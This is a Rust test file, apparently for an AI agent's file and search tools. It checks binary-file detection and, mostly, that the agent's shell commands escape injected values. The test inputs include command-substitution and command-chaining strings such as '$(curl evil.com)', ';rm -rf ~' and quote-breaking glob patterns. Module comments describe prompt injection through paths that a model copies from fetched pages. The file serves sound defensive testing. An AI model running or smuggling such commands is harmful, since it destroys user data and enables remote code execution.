mod binary_detection {
    use std::io::Write as _;

    use async_io::block_on;
    use tempfile::TempDir;

    use super::super::{is_file_content_binary_async, should_read_as_binary};

    fn write_file(dir: &TempDir, name: &str, contents: &[u8]) -> std::path::PathBuf {
        let path = dir.path().join(name);
        let mut file = std::fs::File::create(&path).expect("create temp file");
        file.write_all(contents).expect("write temp file");
        file.flush().expect("flush temp file");
        path
    }

    #[test]
    fn text_file_with_known_extension_is_not_binary() {
        let dir = TempDir::new().expect("create tempdir");
        let path = write_file(&dir, "script.sh", b"#!/usr/bin/env bash\necho hi\n");
        assert!(!block_on(should_read_as_binary(&path)));
    }

    #[test]
    fn binary_file_with_known_extension_is_binary() {
        let dir = TempDir::new().expect("create tempdir");
        // Known binary extension — should be classified as binary without
        // needing content inspection.
        let path = write_file(&dir, "image.png", b"not really a png but extension wins\n");
        assert!(block_on(should_read_as_binary(&path)));
    }

    #[test]
    fn extensionless_shell_script_is_not_binary() {
        // Regression test for QUALITY-507: an extensionless shell script (e.g.
        // `script/linux/bundle`) was being classified as binary solely because
        // its basename isn't in the known extensionless-text allow-list.
        let dir = TempDir::new().expect("create tempdir");
        let path = write_file(
            &dir,
            "bundle",
            b"#!/usr/bin/env bash\n#\n# Builds a Warp binary and bundles it up for distribution.\n\nset -e\n",
        );
        assert!(!block_on(should_read_as_binary(&path)));
    }

    #[test]
    fn extensionless_binary_content_is_binary() {
        // An extensionless file whose contents are actually binary should fall
        // through the content-based check and be classified as binary.
        let dir = TempDir::new().expect("create tempdir");
        let path = write_file(
            &dir,
            "payload",
            // NUL byte is a strong binary signal for content_inspector.
            &[0u8, 1, 2, 3, b'A', 0, 0, 0, 0xFF, 0xFE, 0xFD],
        );
        assert!(block_on(should_read_as_binary(&path)));
    }

    #[test]
    fn extensionless_text_allowlisted_is_not_binary() {
        // Files whose basenames are in the known text allow-list (e.g. README)
        // should take the fast path and skip content inspection.
        let dir = TempDir::new().expect("create tempdir");
        let path = write_file(&dir, "README", b"Hello, world!\n");
        assert!(!block_on(should_read_as_binary(&path)));
    }

    #[test]
    fn empty_extensionless_file_is_not_binary() {
        // `content_inspector` treats an empty buffer as text, which is the
        // desired behavior for `read_files`: an empty file should be
        // surfaced to the agent as an empty string, not as zero binary bytes.
        let dir = TempDir::new().expect("create tempdir");
        let path = write_file(&dir, "empty", b"");
        assert!(!block_on(should_read_as_binary(&path)));
    }

    #[test]
    fn missing_extensionless_file_is_classified_as_binary() {
        // When an extensionless file cannot be opened during content
        // inspection, `should_read_as_binary` must route to the binary path
        // so the binary reader can produce a consistent `Missing` result.
        let dir = TempDir::new().expect("create tempdir");
        let missing = dir.path().join("does-not-exist");
        assert!(block_on(should_read_as_binary(&missing)));
    }

    #[test]
    fn missing_file_helper_is_classified_as_binary() {
        // Direct coverage of the low-level helper: opening a non-existent
        // path must return `true` so the caller doesn't accidentally try the
        // text path on an unreadable file.
        let dir = TempDir::new().expect("create tempdir");
        let missing = dir.path().join("does-not-exist");
        assert!(block_on(is_file_content_binary_async(&missing)));
    }
}

mod path_shell_quoting {
    //! These probes (`is_file_path`, `is_git_repository`) are called as
    //! side-effects of other agent tool calls (`grep`, `glob`) and run on the
    //! user's shell WITHOUT a separate per-command approval gate. A path
    //! containing shell metacharacters — whether legitimate (a folder named
    //! `foo (copy)`) or attacker-influenced via prompt injection (a path the
    //! model copied out of a fetched web page or a file it `read`) — must not
    //! be re-interpreted by the shell. These tests pin the expected
    //! byte-for-byte shape of the emitted commands.
    use super::super::{build_is_file_path_command, build_is_git_repository_command};
    use crate::terminal::shell::ShellType;

    #[test]
    fn is_file_path_plain_posix() {
        assert_eq!(
            build_is_file_path_command("/tmp/file.txt", ShellType::Bash),
            "test -f /tmp/file.txt",
        );
    }

    #[test]
    fn is_file_path_with_spaces_posix() {
        // A path with a space must be a single shell word after escaping.
        assert_eq!(
            build_is_file_path_command("/tmp/has space/file", ShellType::Zsh),
            "test -f /tmp/has\\ space/file",
        );
    }

    #[test]
    fn is_file_path_command_substitution_posix() {
        // Without escaping the shell would run `touch /tmp/PWNED` before
        // `test -f`. After escaping, `$(...)` and `(`/`)` are literal.
        let cmd = build_is_file_path_command("/tmp/x$(touch /tmp/PWNED)y", ShellType::Bash);
        assert!(
            !cmd.contains("$(touch"),
            "command substitution must be neutralized; got: {cmd}",
        );
        assert_eq!(cmd, "test -f /tmp/x\\$\\(touch\\ /tmp/PWNED\\)y");
    }

    #[test]
    fn is_file_path_backtick_substitution_posix() {
        let cmd = build_is_file_path_command("/tmp/`id`", ShellType::Bash);
        assert!(
            !cmd.contains("`id`"),
            "backtick substitution must be neutralized; got: {cmd}",
        );
    }

    #[test]
    fn is_file_path_variable_expansion_posix() {
        // `$HOME` inside the path must not expand to the user's home dir; the
        // `$` is backslash-escaped so the shell treats it as a literal.
        assert_eq!(
            build_is_file_path_command("/tmp/$HOME/x", ShellType::Bash),
            "test -f /tmp/\\$HOME/x",
        );
    }

    #[test]
    fn is_file_path_semicolon_chain_posix() {
        // A trailing `;rm -rf ~` must not turn into a second command; the `;`,
        // spaces, and `~` are all backslash-escaped.
        assert_eq!(
            build_is_file_path_command("/tmp/x;rm -rf ~", ShellType::Bash),
            "test -f /tmp/x\\;rm\\ -rf\\ \\~",
        );
    }

    #[test]
    fn is_file_path_plain_powershell() {
        assert_eq!(
            build_is_file_path_command("C:\\Users\\me\\file.txt", ShellType::PowerShell),
            "if (Test-Path -PathType Leaf C:\\Users\\me\\file.txt) { exit 0 } else { exit 1 }",
        );
    }

    #[test]
    fn is_file_path_command_substitution_powershell() {
        // PowerShell expands `$(...)` inside `"..."`; with backtick-escaping
        // applied, the substitution becomes literal text.
        let cmd =
            build_is_file_path_command("C:\\tmp\\x$(rm -rf ~)y", ShellType::PowerShell);
        assert!(
            !cmd.contains("$(rm"),
            "PowerShell `$(...)` must be neutralized; got: {cmd}",
        );
    }

    #[test]
    fn is_file_path_variable_expansion_powershell() {
        // PowerShell would normally interpolate `$env:HOME`-style references
        // inside `"..."`. Backtick-escaping the `$` makes it literal.
        assert_eq!(
            build_is_file_path_command(
                "C:\\tmp\\$env:USERPROFILE\\x",
                ShellType::PowerShell,
            ),
            "if (Test-Path -PathType Leaf C:\\tmp\\`$env:USERPROFILE\\x) { exit 0 } else { exit 1 }",
        );
    }

    #[test]
    fn is_git_repository_plain_posix() {
        assert_eq!(
            build_is_git_repository_command("/tmp/repo", ShellType::Bash),
            "git -C /tmp/repo rev-parse",
        );
    }

    #[test]
    fn is_git_repository_command_substitution_posix() {
        let cmd = build_is_git_repository_command("/tmp/x$(curl evil.com)", ShellType::Bash);
        assert!(
            !cmd.contains("$(curl"),
            "command substitution must be neutralized; got: {cmd}",
        );
        assert_eq!(cmd, "git -C /tmp/x\\$\\(curl\\ evil.com\\) rev-parse");
    }

    #[test]
    fn is_git_repository_plain_powershell() {
        assert_eq!(
            build_is_git_repository_command("C:\\repo", ShellType::PowerShell),
            "git -C C:\\repo rev-parse",
        );
    }

    #[test]
    fn is_git_repository_command_substitution_powershell() {
        let cmd =
            build_is_git_repository_command("C:\\x$(rm -rf ~)y", ShellType::PowerShell);
        assert!(
            !cmd.contains("$(rm"),
            "PowerShell `$(...)` must be neutralized; got: {cmd}",
        );
    }

    #[test]
    fn is_file_path_fish_uses_posix_escape() {
        // Fish is grouped with the POSIX shell family for escaping purposes
        // (see `From<ShellType> for ShellFamily`).
        let cmd = build_is_file_path_command("/tmp/x$(id)y", ShellType::Fish);
        assert!(!cmd.contains("$(id)"));
        assert!(cmd.starts_with("test -f "));
    }
}

mod grep_shell_quoting {
    //! `target_path` *and* `queries` flow from the agent into the shell command
    //! `git grep` / `grep` / `Select-String` runs against the user's session.
    //! Without escaping, an agent-supplied query like `$(touch ~/PWNED)` runs
    //! as a side-effect of the grep tool call — same silent-RCE class as the
    //! `is_file_path` / `is_git_repository` probes. These tests pin the
    //! byte-exact shape of the emitted commands.
    use super::super::grep::{
        build_git_grep_command, build_grep_command, build_select_string_command,
    };
    use crate::terminal::shell::ShellType;

    #[test]
    fn git_grep_plain_posix() {
        assert_eq!(
            build_git_grep_command(
                &["TODO".to_string(), "fix".to_string()],
                "/repo",
                ShellType::Bash,
            ),
            "git --no-pager grep --color=never --untracked -nIE -e TODO -e fix /repo",
        );
    }

    #[test]
    fn git_grep_neutralises_query_command_substitution_posix() {
        // Without escaping, this would run `touch ~/PWNED` before `git grep`.
        let cmd = build_git_grep_command(
            &["$(touch ~/PWNED)".to_string()],
            "/repo",
            ShellType::Bash,
        );
        assert!(!cmd.contains("$(touch"), "got: {cmd}");
        assert_eq!(
            cmd,
            "git --no-pager grep --color=never --untracked -nIE -e \\$\\(touch\\ \\~/PWNED\\) /repo",
        );
    }

    #[test]
    fn git_grep_neutralises_query_backticks_posix() {
        let cmd = build_git_grep_command(
            &["`id`".to_string()],
            "/repo",
            ShellType::Bash,
        );
        assert!(!cmd.contains("`id`"), "got: {cmd}");
    }

    #[test]
    fn git_grep_neutralises_target_substitution_posix() {
        let cmd = build_git_grep_command(
            &["foo".to_string()],
            "/tmp/x$(curl evil.com)",
            ShellType::Bash,
        );
        assert!(!cmd.contains("$(curl"), "got: {cmd}");
    }

    #[test]
    fn git_grep_neutralises_query_substitution_powershell() {
        // PowerShell expands `$(...)` inside `"..."`; with backtick-escaping
        // the substitution becomes literal text.
        let cmd = build_git_grep_command(
            &["$(rm -rf ~)".to_string()],
            "C:\\repo",
            ShellType::PowerShell,
        );
        assert!(!cmd.contains("$(rm"), "got: {cmd}");
    }

    #[test]
    fn grep_neutralises_query_substitution() {
        let cmd = build_grep_command(&["$(id)".to_string()], "/repo");
        assert!(!cmd.contains("$(id)"), "got: {cmd}");
        assert_eq!(
            cmd,
            "grep --color=never -nrIHE --devices=skip -e \\$\\(id\\) /repo",
        );
    }

    #[test]
    fn grep_neutralises_query_semicolon_chain() {
        // A query like `;rm -rf ~` must not turn into a second command.
        let cmd = build_grep_command(&["x;rm -rf ~".to_string()], "/repo");
        assert!(!cmd.contains(" ;rm") && !cmd.contains(" -rf "), "got: {cmd}");
    }

    #[test]
    fn select_string_neutralises_query_substitution() {
        // Mirrors the POSIX case for the PowerShell Select-String path.
        let cmd = build_select_string_command(
            &["$(rm -rf ~)".to_string()],
            "C:\\repo",
        );
        assert!(!cmd.contains("$(rm"), "got: {cmd}");
        assert!(cmd.contains("Select-String"));
    }

    #[test]
    fn select_string_neutralises_target_substitution() {
        let cmd = build_select_string_command(
            &["foo".to_string()],
            "C:\\tmp\\x$(curl evil.com)y",
        );
        assert!(!cmd.contains("$(curl"), "got: {cmd}");
    }
}

mod file_glob_shell_quoting {
    //! `target_path` *and* `patterns` flow from the agent into the shell
    //! command `find` / `git ls-files` / `Get-ChildItem` runs against the
    //! user's session. Patterns are particularly easy to miss because the
    //! previous code wrapped them in `'...'` (POSIX) or `'...'` (PowerShell)
    //! without escaping embedded `'`, so a pattern containing `'` could close
    //! the quote and append a fresh shell command. These tests pin the
    //! byte-exact shape of the emitted commands.
    use super::super::file_glob::{
        build_find_command, build_git_ls_files_command, build_powershell_get_childitem_command,
    };

    #[test]
    fn find_plain_posix() {
        assert_eq!(
            build_find_command(&["*.rs".to_string()], "/repo"),
            "find /repo -type f  -name \\*.rs",
        );
    }

    #[test]
    fn find_neutralises_pattern_embedded_single_quote() {
        // A pattern containing `'` previously closed the surrounding `'...'`
        // pair and could append `; rm -rf ~`. After escaping, the `'` is
        // backslash-escaped and stays inside the `-name` argument.
        let cmd = build_find_command(
            &["foo';rm -rf ~;echo '".to_string()],
            "/repo",
        );
        assert!(
            !cmd.contains("';rm") && !cmd.contains("rf ~"),
            "got: {cmd}",
        );
    }

    #[test]
    fn find_neutralises_pattern_substitution() {
        let cmd = build_find_command(&["$(touch ~/PWNED)".to_string()], "/repo");
        assert!(!cmd.contains("$(touch"), "got: {cmd}");
    }

    #[test]
    fn find_neutralises_target_substitution() {
        let cmd = build_find_command(&["*.rs".to_string()], "/tmp/x$(id)y");
        assert!(!cmd.contains("$(id)"), "got: {cmd}");
    }

    #[test]
    fn git_ls_files_neutralises_pattern_embedded_single_quote() {
        let cmd = build_git_ls_files_command(
            &["foo';rm -rf ~;echo '".to_string()],
            "/repo",
            None,
        );
        assert!(
            !cmd.contains("';rm") && !cmd.contains("rf ~"),
            "got: {cmd}",
        );
    }

    #[test]
    fn git_ls_files_neutralises_pattern_substitution() {
        let cmd = build_git_ls_files_command(
            &["$(touch ~/PWNED)".to_string()],
            "/repo",
            None,
        );
        assert!(!cmd.contains("$(touch"), "got: {cmd}");
    }

    #[test]
    fn powershell_get_childitem_neutralises_pattern_embedded_single_quote() {
        // PowerShell `'...'` literal strings close on `'`, the same way POSIX
        // ones do; after backtick-escaping, the embedded `'` is literal.
        let cmd = build_powershell_get_childitem_command(
            &["foo';rm -rf ~;echo '".to_string()],
            "C:\\repo",
        );
        assert!(
            !cmd.contains("';rm") && !cmd.contains("rf ~"),
            "got: {cmd}",
        );
    }

    #[test]
    fn powershell_get_childitem_neutralises_pattern_substitution() {
        let cmd = build_powershell_get_childitem_command(
            &["$(rm -rf ~)".to_string()],
            "C:\\repo",
        );
        assert!(!cmd.contains("$(rm"), "got: {cmd}");
    }

    #[test]
    fn powershell_get_childitem_neutralises_target_substitution() {
        let cmd = build_powershell_get_childitem_command(
            &["*.rs".to_string()],
            "C:\\tmp\\x$(rm -rf ~)y",
        );
        assert!(!cmd.contains("$(rm"), "got: {cmd}");
    }
}
